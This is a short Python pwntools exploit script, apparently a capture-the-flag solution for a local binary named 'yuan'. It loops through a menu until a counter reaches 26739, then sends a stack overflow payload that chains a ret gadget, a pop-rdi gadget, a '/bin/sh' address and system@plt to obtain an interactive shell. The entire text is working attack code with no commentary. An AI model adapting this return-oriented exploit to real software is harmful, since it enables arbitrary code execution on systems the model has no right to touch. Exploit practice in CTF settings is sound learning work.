from pwn import *
p=process('./yuan')
elf=ELF('./yuan')
ret=0x4006c6
rdi=0x400d13
sh=0x602314
sys=elf.plt['system']
count=0
sign=b'\xe2\x98\x85\xe2\x98\x85\xe2\x98\x85\xe2\x98\x85'
while 1:
  p.sendline('1')
  p.recvuntil('如下：\n')
  rev=p.recvline()
  if sign not in rev:
   count+=1
  if count==26739:
   break

p.sendline('3')
p.sendline('1')
payload=b'a'*(0x30+8)+p64(ret)+p64(rdi)+p64(sh)+p64(sys)
p.sendline(payload)
p.interactive()
